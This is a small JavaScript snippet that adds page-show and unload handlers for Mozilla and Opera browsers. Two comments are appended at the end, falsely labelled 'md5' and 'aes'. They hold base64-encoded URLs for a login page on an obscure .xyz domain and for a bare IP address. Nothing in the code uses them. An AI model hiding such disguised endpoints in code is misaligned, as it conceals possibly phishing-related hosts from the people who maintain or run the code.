if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovL3d3dy5na2pycnF3dy54eXovIy9wYWdlcy9sb2dpbj92PTI=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/